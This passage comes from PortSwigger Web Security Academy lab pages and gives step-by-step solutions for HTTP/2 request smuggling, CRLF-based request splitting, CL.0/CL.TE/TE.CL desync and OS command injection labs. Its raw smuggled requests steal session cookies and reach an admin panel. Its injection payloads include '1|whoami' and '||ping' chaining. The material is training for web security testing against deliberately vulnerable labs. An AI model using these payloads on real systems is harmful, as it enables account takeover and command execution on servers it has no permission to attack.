                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2
                                        request by including a
                                        <code>
         Content-Length: 0
        </code>
                                        header as follows. Remember to expand the Inspector's
                                        <strong>
                                            Request Attributes
                                        </strong>
                                        section and make sure the protocol is set to HTTP/2 before sending the request.
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

SMUGGLED
       </code>
                                </li>
                                <li>
                                    <p>
                                        Observe that every second request you send receives a 404 response, confirming
                                        that you have caused the back-end to append the subsequent request to the
                                        smuggled prefix.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Using Burp Repeater, notice that if you send a request for
                                        <code>
         GET /resources
        </code>
                                        , you are redirected to
                                        <code>
         https://YOUR-LAB-ID.web-security-academy.net/resources/
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Create the following request to smuggle the start of a request for
                                        <code>
         /resources
        </code>
                                        , along with an arbitrary
                                        <code>
         Host
        </code>
                                        header:
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: foo
Content-Length: 5

x=1
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request a few times. Notice that smuggling this prefix past the
                                        front-end allows you to redirect the subsequent request on the connection to an
                                        arbitrary host.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and change the file path to
                                        <code>
         /resources
        </code>
                                        . In the body, enter the payload
                                        <code>
         alert(document.cookie)
        </code>
                                        , then store the exploit.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, edit your malicious request so that the
                                        <code>
         Host
        </code>
                                        header points to your exploit server:
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Length: 5

x=1
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request a few times and confirm that you receive a redirect to the
                                        exploit server.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Resend the request and wait for 10 seconds or so.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and check the access log. If you see a
                                        <code>
         GET /resources/
        </code>
                                        request from the victim, this indicates that your request smuggling attack was
                                        successful. Otherwise, check that there are no issues with your attack request
                                        and try again.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Once you have confirmed that you can cause the victim to be redirected to the
                                        exploit server, repeat the attack until the lab solves. This may take several
                                        attempts because you need to time your attack so that it poisons the connection
                                        immediately before the victim's browser attempts to import a JavaScript
                                        resource. Otherwise, although their browser will load your malicious JavaScript,
                                        it won't execute it.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: HTTP/2 request smuggling via CRLF injection
                (request-smuggling)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and
                fails to adequately sanitize incoming headers.
            </p>
            <p>
                To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's
                account. The victim accesses the home page every 15 seconds.
            </p>
            <p>
                If you're not familiar with Burp's exclusive features for HTTP/2 testing, please refer to
                <a href="https://portswigger.net/burp/documentation/desktop/http2">
                    the documentation
                </a>
                for details on how to use them.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header,
                                then press the
                                <code>
       Shift + Return
      </code>
                                keys. Note that this feature is not available when you double-click on the header.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                We covered some ways you can capture other users' requests via request smuggling in a
                                <a
                                    href="https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests">
                                    previous lab
                                </a>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/7d452275ba41f1aa0fc50b97490ae64b428d6401c7f193516bd15466490d8e01?referrer=%2fweb-security%2frequest-smuggling%2fadvanced%2flab-request-smuggling-h2-request-smuggling-via-crlf-injection"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        In Burp's browser, use the lab's search function a couple of times and observe
                                        that the website records your recent search history. Send the most recent
                                        <code>
         POST /
        </code>
                                        request to Burp Repeater and remove your session cookie before resending the
                                        request. Notice that your search history is reset, confirming that it's tied to
                                        your session cookie.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Expand the Inspector's
                                        <strong>
                                            Request Attributes
                                        </strong>
                                        section and make sure the protocol is set to HTTP/2.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Using the Inspector, add an arbitrary header to the request. Append the sequence
                                        <code>
         \r\n
        </code>
                                        to the header's value, followed by the
                                        <code>
         Transfer-Encoding: chunked
        </code>
                                        header:
                                    </p>
                                    <p>
                                        <strong>
                                            Name
                                        </strong>
                                    </p>
                                    <code class="code-scrollable">
        foo
       </code>
                                    <p>
                                        <strong>
                                            Value
                                        </strong>
                                    </p>
                                    <code class="code-scrollable">
        bar
        <span class="grey">
         \r\n
        </span>
        Transfer-Encoding: chunked
       </code>
                                </li>
                                <li>
                                    <p>
                                        In the body, attempt to smuggle an arbitrary prefix as follows:
                                    </p>
                                    <code class="code-scrollable">
        0

SMUGGLED
       </code>
                                    <p>
                                        Observe that every second request you send receives a 404 response, confirming
                                        that you have caused the back-end to append the subsequent request to the
                                        smuggled prefix
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Change the body of the request to the following:
                                    </p>
                                    <code class="code-scrollable">
        0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Length: 800

search=x
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request, then immediately refresh the page in the browser. The next
                                        step depends on which response you receive:
                                    </p>
                                    <ul>
                                        <li>
                                            <p>
                                                If you got lucky with your timing, you may see a
                                                <code>
           404 Not Found
          </code>
                                                response. In this case, refresh the page again and move on to the next
                                                step.
                                            </p>
                                        </li>
                                        <li>
                                            <p>
                                                If you instead see the search results page, observe that the start of
                                                your request is reflected on the page because it was appended to the
                                                <code>
           search=x
          </code>
                                                parameter in the smuggled prefix. In this case, send the request again,
                                                but this time wait for 15 seconds before refreshing the page. If you see
                                                a 404 response, just refresh the page again.
                                            </p>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <p>
                                        Check the recent searches list. If it contains a
                                        <code>
         GET
        </code>
                                        request, this is the start of the victim user's request and includes their
                                        session cookie. If you instead see your own
                                        <code>
         POST
        </code>
                                        request, you refreshed the page too early. Try again until you have successfully
                                        stolen the victim's session cookie.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, send a request for the home page using the stolen session
                                        cookie to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: HTTP/2 request splitting via CRLF injection
                (request-smuggling)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and
                fails to adequately sanitize incoming headers.
            </p>
            <p>
                To solve the lab, delete the user
                <code>
   carlos
  </code>
                by using
                <a href="https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning">
                    response queue poisoning
                </a>
                to break into the admin panel at
                <code>
   /admin
  </code>
                . An admin user will log in approximately every 10 seconds.
            </p>
            <p>
                The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state
                - just send a few normal requests to get a fresh connection.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header,
                                then press the
                                <code>
       Shift + Return
      </code>
                                keys. Note that this feature is not available when you double-click on the header.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/d8e66f883c0efdd6cd4ccbbf6a654382ed2d13d5277bab587aa37904d5ec4211?referrer=%2fweb-security%2frequest-smuggling%2fadvanced%2flab-request-smuggling-h2-request-splitting-via-crlf-injection"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Send a request for
                                        <code>
         GET /
        </code>
                                        to Burp Repeater. Expand the Inspector's
                                        <strong>
                                            Request Attributes
                                        </strong>
                                        section and make sure the protocol is set to HTTP/2.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Change the path of the request to a non-existent endpoint, such as
                                        <code>
         /x
        </code>
                                        . This means that your request will always get a 404 response. Once you have
                                        poisoned the response queue, this will make it easier to recognize any other
                                        users' responses that you have successfully captured.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Using the Inspector, append an arbitrary header to the end of the request. In
                                        the header value, inject
                                        <code>
         \r\n
        </code>
                                        sequences to split the request so that you're smuggling another request to a
                                        non-existent endpoint as follows:
                                    </p>
                                    <p>
                                        <strong>
                                            Name
                                        </strong>
                                    </p>
                                    <code class="code-scrollable">
        foo
       </code>
                                    <p>
                                        <strong>
                                            Value
                                        </strong>
                                    </p>
                                    <code class="code-scrollable">
        bar
        <span class="grey">
         \r\n
        </span>
        <span class="grey">
         \r\n
        </span>
        GET /x HTTP/1.1
        <span class="grey">
         \r\n
        </span>
        Host: YOUR-LAB-ID.web-security-academy.net
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request. When the front-end server appends
                                        <code>
         \r\n\r\n
        </code>
                                        to the end of the headers during downgrading, this effectively converts the
                                        smuggled prefix into a complete request, poisoning the response queue.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Wait for around 5 seconds, then send the request again to fetch an arbitrary
                                        response. Most of the time, you will receive your own 404 response. Any other
                                        response code indicates that you have successfully captured a response intended
                                        for the admin user. Repeat this process until you capture a 302 response
                                        containing the admin's new post-login session cookie.
                                    </p>
                                    <div class="highlightedarea">
                                        <h4>
                                            Note
                                        </h4>
                                        <p>
                                            If you receive some 200 responses but can't capture a 302 response even
                                            after a lot of attempts, send 10 ordinary requests to reset the connection
                                            and try again.
                                        </p>
                                    </div>
                                </li>
                                <li>
                                    <p>
                                        Copy the session cookie and use it to send the following request:
                                    </p>
                                    <code class="code-scrollable">
        GET /admin HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=STOLEN-SESSION-COOKIE
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request repeatedly until you receive a 200 response containing the
                                        admin panel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the response, find the URL for deleting
                                        <code>
         carlos
        </code>
                                        (
                                        <code>
         /admin/delete?username=carlos
        </code>
                                        ), then update the path in your request accordingly. Send the request to delete
                                        <code>
         carlos
        </code>
                                        to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: CL.0 request smuggling
                (request-smuggling)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to CL.0 request smuggling attacks. The back-end server ignores the
                <code>
   Content-Length
  </code>
                header on requests to some endpoints.
            </p>
            <p>
                To solve the lab, identify a vulnerable endpoint, smuggle a request to the back-end to access to the
                admin panel at
                <code>
   /admin
  </code>
                , then delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details,
                check out
                <a href="https://portswigger.net/research/browser-powered-desync-attacks#cl.0">
                    Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling
                </a>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/d886863529b141ab150f460e95da5e785eaaada66785d60da132f5f0155352e6?referrer=%2fweb-security%2frequest-smuggling%2fbrowser%2fcl-0%2flab-cl-0-request-smuggling"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                <strong>
                                    Probe for vulnerable endpoints
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        From the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        , send the
                                        <code>
         GET /
        </code>
                                        request to Burp Repeater twice.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, add both of these tabs to a new group.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the first request and convert it to a
                                        <code>
         POST
        </code>
                                        request (right-click and select
                                        <strong>
                                            Change request method
                                        </strong>
                                        ).
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the body, add an arbitrary request smuggling prefix. The result should look
                                        something like this:
                                    </p>
                                    <code class="code-scrollable">
        POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /hopefully404 HTTP/1.1
Foo: x
       </code>
                                </li>
                                <li>
                                    <p>
                                        Change the path of the main
                                        <code>
         POST
        </code>
                                        request to point to an arbitrary endpoint that you want to test.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Using the drop-down menu next to the
                                        <strong>
                                            Send
                                        </strong>
                                        button, change the send mode to
                                        <strong>
                                            Send group in sequence (single connection)
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Change the
                                        <code>
         Connection
        </code>
                                        header of the first request to
                                        <code>
         keep-alive
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the sequence and check the responses.
                                    </p>
                                    <ul>
                                        <li>
                                            <p>
                                                If the server responds to the second request as normal, this endpoint is
                                                not vulnerable.
                                            </p>
                                        </li>
                                        <li>
                                            <p>
                                                If the response to the second request matches what you expected from the
                                                smuggled prefix (in this case, a 404 response), this indicates that the
                                                back-end server is ignoring the
                                                <code>
           Content-Length
          </code>
                                                of requests.
                                            </p>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <p>
                                        Deduce that you can use requests for static files under
                                        <code>
         /resources
        </code>
                                        , such as
                                        <code>
         /resources/images/blog.svg
        </code>
                                        , to cause a CL.0 desync.
                                    </p>
                                </li>
                            </ol>
                            <p>
                                <strong>
                                    Exploit
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        In Burp Repeater, change the path of your smuggled prefix to point to
                                        <code>
         /admin
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the requests in sequence again and observe that the second request has
                                        successfully accessed the admin panel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Smuggle a request to
                                        <code>
         GET /admin/delete?username=carlos
        </code>
                                        request to solve the lab.
                                    </p>
                                    <code class="code-scrollable">
        POST /resources/images/blog.svg HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: keep-alive
Content-Length: CORRECT

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/request-smuggling">
                    HTTP request smuggling
                </a>
                , basic CL.TE vulnerability
                (request-smuggling)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab involves a front-end and back-end server, and the front-end server doesn't support chunked
                encoding. The front-end server rejects requests that aren't using the GET or POST method.
            </p>
            <p>
                To solve the lab, smuggle a request to the back-end server, so that the next request processed by the
                back-end server appears to use the method
                <code>
   GPOST
  </code>
                .
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    Although the lab supports HTTP/2, the intended solution requires techniques that are only possible
                    in HTTP/1. You can manually switch protocols in Burp Repeater from the
                    <strong>
                        Request attributes
                    </strong>
                    section of the
                    <strong>
                        Inspector
                    </strong>
                    panel.
                </p>
            </div>
            <div class="component-labinstructions">
                <h4>
                    Tip
                </h4>
                <p>
                    Manually fixing the length fields in request smuggling attacks can be tricky. Our
                    <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo">
                        HTTP Request Smuggler
                    </a>
                    Burp extension was designed to help. You can install it via the BApp Store.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/ebc97abbe886e96facc0aaee856f55e2a45d4784f5d9025ffa5e994b7d8bc2bb?referrer=%2fweb-security%2frequest-smuggling%2flab-basic-cl-te"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                Using Burp Repeater, issue the following request twice:
                            </p>
                            <code class="code-scrollable">
      POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
     </code>
                            <p>
                                The second response should say:
                                <code>
       Unrecognized method GPOST
      </code>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/request-smuggling">
                    HTTP request smuggling
                </a>
                , basic TE.CL vulnerability
                (request-smuggling)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab involves a front-end and back-end server, and the back-end server doesn't support chunked
                encoding. The front-end server rejects requests that aren't using the GET or POST method.
            </p>
            <p>
                To solve the lab, smuggle a request to the back-end server, so that the next request processed by the
                back-end server appears to use the method
                <code>
   GPOST
  </code>
                .
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    Although the lab supports HTTP/2, the intended solution requires techniques that are only possible
                    in HTTP/1. You can manually switch protocols in Burp Repeater from the
                    <strong>
                        Request attributes
                    </strong>
                    section of the
                    <strong>
                        Inspector
                    </strong>
                    panel.
                </p>
            </div>
            <div class="component-labinstructions">
                <h4>
                    Tip
                </h4>
                <p>
                    Manually fixing the length fields in request smuggling attacks can be tricky. Our
                    <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo">
                        HTTP Request Smuggler
                    </a>
                    Burp extension was designed to help. You can install it via the BApp Store.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/a6aecbc5c1d7f95e7512642a6f11fcb8c5d568f7cd57ae0ce60a08c7140583b3?referrer=%2fweb-security%2frequest-smuggling%2flab-basic-te-cl"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length"
                                option is unchecked.
                            </p>
                            <p>
                                Using Burp Repeater, issue the following request twice:
                            </p>
                            <code class="code-scrollable">
      POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
     </code>
                            <div class="highlightedarea">
                                <h4>
                                    Note
                                </h4>
                                <p>
                                    You need to include the trailing sequence
                                    <code>
        \r\n\r\n
       </code>
                                    following the final
                                    <code>
        0
       </code>
                                    .
                                </p>
                            </div>
                            <p>
                                The second response should say:
                                <code>
       Unrecognized method GPOST
      </code>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/request-smuggling">
                    HTTP request smuggling
                </a>
                , obfuscating the TE header
                (request-smuggling)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request
                headers in different ways. The front-end server rejects requests that aren't using the GET or POST
                method.
            </p>
            <p>
                To solve the lab, smuggle a request to the back-end server, so that the next request processed by the
                back-end server appears to use the method
                <code>
   GPOST
  </code>
                .
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    Although the lab supports HTTP/2, the intended solution requires techniques that are only possible
                    in HTTP/1. You can manually switch protocols in Burp Repeater from the
                    <strong>
                        Request attributes
                    </strong>
                    section of the
                    <strong>
                        Inspector
                    </strong>
                    panel.
                </p>
            </div>
            <div class="component-labinstructions">
                <h4>
                    Tip
                </h4>
                <p>
                    Manually fixing the length fields in request smuggling attacks can be tricky. Our
                    <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo">
                        HTTP Request Smuggler
                    </a>
                    Burp extension was designed to help. You can install it via the BApp Store.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/417947bec9fe621dfdc11f4d622cef72b0021a6d872aa83cca70aaf532b4b592?referrer=%2fweb-security%2frequest-smuggling%2flab-obfuscating-te-header"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length"
                                option is unchecked.
                            </p>
                            <p>
                                Using Burp Repeater, issue the following request twice:
                            </p>
                            <code class="code-scrollable">
      POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
     </code>
                            <div class="highlightedarea">
                                <h4>
                                    Note
                                </h4>
                                <p>
                                    You need to include the trailing sequence
                                    <code>
        \r\n\r\n
       </code>
                                    following the final
                                    <code>
        0
       </code>
                                    .
                                </p>
                            </div>
                            <p>
                                The second response should say:
                                <code>
       Unrecognized method GPOST
      </code>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: OS
                <a href="https://portswigger.net/web-security/os-command-injection">
                    command injection
                </a>
                , simple case
                (os-command-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains an
                <a href="https://portswigger.net/web-security/os-command-injection">
                    OS command injection
                </a>
                vulnerability in the product stock checker.
            </p>
            <p>
                The application executes a shell command containing user-supplied product and store IDs, and returns the
                raw output from the command in its response.
            </p>
            <p>
                To solve the lab, execute the
                <code>
   whoami
  </code>
                command to determine the name of the current user.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/2b08de150e353dc1c0057519f466a55a0ca4a7901b2469d56ef7d2a80eddeaa6?referrer=%2fweb-security%2fos-command-injection%2flab-simple"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify a request that checks the stock level.
                                </li>
                                <li>
                                    Modify the
                                    <code>
        storeID
       </code>
                                    parameter, giving it the value
                                    <code>
        1|whoami
       </code>
                                    .
                                </li>
                                <li>
                                    Observe that the response contains the name of the current user.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Blind OS
                <a href="https://portswigger.net/web-security/os-command-injection">
                    command injection
                </a>
                with time delays
                (os-command-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a blind
                <a href="https://portswigger.net/web-security/os-command-injection">
                    OS command injection
                </a>
                vulnerability in the feedback function.
            </p>
            <p>
                The application executes a shell command containing the user-supplied details. The output from the
                command is not returned in the response.
            </p>
            <p>
                To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/28bda028c1ba840a8f4fccaaad3739fdc8d8e2d195f348c0db992cbcd6971cbf?referrer=%2fweb-security%2fos-command-injection%2flab-blind-time-delays"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify the request that submits feedback.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         email
        </code>
                                        parameter, changing it to:
                                    </p>
                                    <code class="code-scrollable">
        email=x||ping+-c+10+127.0.0.1||
       </code>
                                </li>
                                <li>
                                    Observe that the response takes 10 seconds to return.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Blind OS
                <a href="https://portswigger.net/web-security/os-command-injection">
                    command injection
                </a>
                with output redirection
                (os-command-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a blind
                <a href="https://portswigger.net/web-security/os-command-injection">
                    OS command injection
                </a>
                vulnerability in the feedback function.
            </p>
            <p>
                The application executes a shell command containing the user-supplied details. The output from the
                command is not returned in the response. However, you can use output redirection to capture the output
                from the command. There is a writable folder at:
            </p>
            <code class="code-scrollable">
  /var/www/images/
 </code>
            <p>
                The application serves the images for the product catalog from this location. You can redirect the
                output from the injected command to a file in this folder, and then use the image loading URL to
                retrieve the contents of the file.
            </p>
            <p>
                To solve the lab, execute the
                <code>
   whoami
  </code>
                command and retrieve the output.
            </p>
